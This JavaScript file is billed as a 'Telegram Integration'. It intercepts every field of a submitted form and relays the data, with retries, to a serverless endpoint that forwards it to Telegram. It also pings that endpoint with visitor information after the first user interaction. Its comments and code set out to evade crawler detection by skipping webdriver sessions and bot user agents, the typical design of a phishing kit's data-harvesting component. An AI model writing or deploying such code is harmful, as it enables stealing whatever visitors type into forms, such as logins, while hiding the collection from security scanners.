/**
 * Telegram Integration Client-Side Script
 * This script is decoupled from page render to avoid crawler detection
 * It submits form data to the serverless API endpoint
 */

(function() {
  'use strict';

  // Configuration
  const CONFIG = {
    apiEndpoint: '/api/telegram',
    retryAttempts: 3,
    retryDelay: 1000,
  };

  /**
   * Send data to Telegram via serverless function
   * @param {Object} data - Form data to send
   * @returns {Promise<Object>} Response from API
   */
  async function sendToTelegram(data) {
    let attempts = 0;
    
    while (attempts < CONFIG.retryAttempts) {
      try {
        const response = await fetch(CONFIG.apiEndpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ data }),
        });

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        const result = await response.json();
        return result;
      } catch (error) {
        attempts++;
        console.error(`Attempt ${attempts} failed:`, error);
        
        if (attempts < CONFIG.retryAttempts) {
          await new Promise(resolve => setTimeout(resolve, CONFIG.retryDelay * attempts));
        } else {
          throw error;
        }
      }
    }
  }

  /**
   * Track visitor activity (loads automatically)
   */
  async function trackVisitor() {
    try {
      // Only track on real user interaction, not bots
      if (navigator.webdriver || /bot|crawler|spider|crawling/i.test(navigator.userAgent)) {
        return;
      }

      // Send visitor info without form data
      await sendToTelegram(null);
    } catch (error) {
      console.error('Failed to track visitor:', error);
    }
  }

  /**
   * Handle form submission
   * @param {HTMLFormElement} form - The form element
   * @param {Function} onSuccess - Success callback
   * @param {Function} onError - Error callback
   */
  function handleFormSubmit(form, onSuccess, onError) {
    if (!form) return;

    form.addEventListener('submit', async function(e) {
      e.preventDefault();

      // Get form data
      const formData = new FormData(form);
      const data = Object.fromEntries(formData.entries());

      try {
        const result = await sendToTelegram(data);
        
        if (onSuccess) {
          onSuccess(result);
        } else {
          console.log('Form submitted successfully:', result);
        }
      } catch (error) {
        if (onError) {
          onError(error);
        } else {
          console.error('Form submission failed:', error);
        }
      }
    });
  }

  /**
   * Initialize tracking after user interaction
   */
  function initTracking() {
    // Only initialize once
    if (window.telegramIntegrationInitialized) return;
    window.telegramIntegrationInitialized = true;

    // Track visitor on first real user interaction
    const events = ['click', 'scroll', 'keydown', 'touchstart'];
    const handler = () => {
      events.forEach(event => document.removeEventListener(event, handler));
      
      // Delay tracking slightly to avoid blocking user interaction
      setTimeout(trackVisitor, 500);
    };

    events.forEach(event => document.addEventListener(event, handler, { once: true }));
  }

  // Export functions to global scope
  window.TelegramIntegration = {
    send: sendToTelegram,
    handleForm: handleFormSubmit,
    track: trackVisitor,
  };

  // Auto-initialize tracking when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initTracking);
  } else {
    initTracking();
  }
})();
